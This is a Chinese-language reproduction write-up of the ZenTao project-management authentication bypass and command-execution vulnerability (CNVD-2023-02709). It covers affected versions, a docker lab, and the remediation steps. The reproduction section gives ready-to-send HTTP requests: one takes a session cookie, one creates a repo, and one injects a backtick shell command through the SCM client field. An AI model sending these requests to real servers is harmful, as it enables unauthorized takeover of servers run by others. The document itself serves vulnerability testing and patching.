# 禅道 misc-captcha-user.html 权限绕过&命令执行漏洞 CNVD-2023-02709

## 漏洞描述

禅道项目管理系统存在远程命令执行漏洞，该漏洞源于在认证过程中未正确退出程序，导致认证绕过，并且后台中有多种执⾏命令的⽅式，攻击者可利用该漏洞在目标服务器上注入任意命令，实现未授权接管服务器。

参考链接：

- https://www.zentao.net/book/zentaoprohelp/41.html
- https://www.zentao.net/book/zentaopms/405.html

## 漏洞影响

```
禅道 >=17.4，<=18.0.beta1（开源版）
禅道 >=7.4，<=8.0.beta1（企业版）
禅道 >=3.4，<=4.0.beta1（旗舰版）
```

## 环境搭建

[源码安装](https://github.com/easysoft/zentaopms/archive/refs/tags/zentaopms_18.0.beta1.zip)，或执行如下命令启动一个禅道 18.0.beta1 服务器：

```
docker compose up -d
```

docker-compose.yml

```
services:
  zentao:
    image: easysoft/zentao:18.0.beta1
    ports:
      - "8084:80"
    environment:
      - MYSQL_INTERNAL=true
    volumes:
      - /data/zentao:/data
```

服务启动后，访问 `http://your-ip:8084` 即可查看到安装页面，默认配置安装直至完成，数据库默认账号密码为 `root/123456`：

![](images/禅道%20misc-captcha-user.html%20权限绕过&命令执行漏洞%20CNVD-2023-02709/image-20250407085551929.png)

![](images/禅道%20misc-captcha-user.html%20权限绕过&命令执行漏洞%20CNVD-2023-02709/image-20250407101758458.png)

## 漏洞复现

查看版本号：

```
http://your-ip:8084/?mode=getconfig
-----
{"version":"18.0.beta1","requestType":"PATH_INFO","requestFix":"-","moduleVar":"m","methodVar":"f","viewVar":"t","sessionVar":"zentaosid","systemMode":"ALM","sprintConcept":"0","URAndSR":"0","maxUploadSize":"50M","sessionName":"zentaosid","sessionID":"k6s9ogaog0hv3b8jjg1vqr6ll4","random":503,"expiredTime":"1440","serverTime":1743992417,"rand":503}
```

![](images/禅道%20misc-captcha-user.html%20权限绕过&命令执行漏洞%20CNVD-2023-02709/image-20250407102034668.png)

请求 `http://your-ip:8084/misc-captcha-user.html` ，在 `Set-Cookie` 中获取 `zentaosid`。

创建并制定仓库为 GItlab：

```
POST /repo-create.html HTTP/1.1
Host: your-ip:8084
Cookie: zentaosid=69ld7c5h6n02k7i4iumt346den; lang=zh-cn; device=desktop; theme=default
Referer: http://your-ip:8084/index.php?m=user&f=login&referer=L2luZGV4LnBocD9tPXJlcG8mZj1jcmVhdGUmX3NpbmdsZT0xMjM=
Accept-Encoding: gzip
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5408.146 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Content-Length: 154

product%5B%5D=1&SCM=Gitlab&name=poc&path=&encoding=utf-8&client=&account=&password=&encrypt=base64&desc=&uid=
```

![](images/禅道%20misc-captcha-user.html%20权限绕过&命令执行漏洞%20CNVD-2023-02709/image-20250407102230251.png)

命令执行：

```
POST /repo-edit-10000-10000.html HTTP/1.1
Host: your-ip:8084
Content-Type: application/x-www-form-urlencoded
Cookie: zentaosid=69ld7c5h6n02k7i4iumt346den; lang=zh-cn; device=desktop; theme=default
Referer: http://your-ip:8084/index.php?m=user&f=login&referer=L2luZGV4LnBocD9tPXJlcG8mZj1jcmVhdGUmX3NpbmdsZT0xMjM=
X-Requested-With: XMLHttpRequest
Accept-Encoding: gzip
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5408.146 Safari/537.36
Content-Length: 112

SCM=Subversion&client=`id`
```

![](images/禅道%20misc-captcha-user.html%20权限绕过&命令执行漏洞%20CNVD-2023-02709/image-20250407102450815.png)

## 漏洞修复

[升级]() 至安全版本：

- 开源版升级至 18.0.beta2 及以上版本；
- 企业版升级至 8.0.bate2 及以上版本；
- 旗舰版升级至 4.0.bate2 及以上版本。

临时防护措施：

- 可在 `module/common/model.php` 文件中 `echo $endResponseException->getContent();` 后面加上 `exit();` 来修复权限绕过漏洞
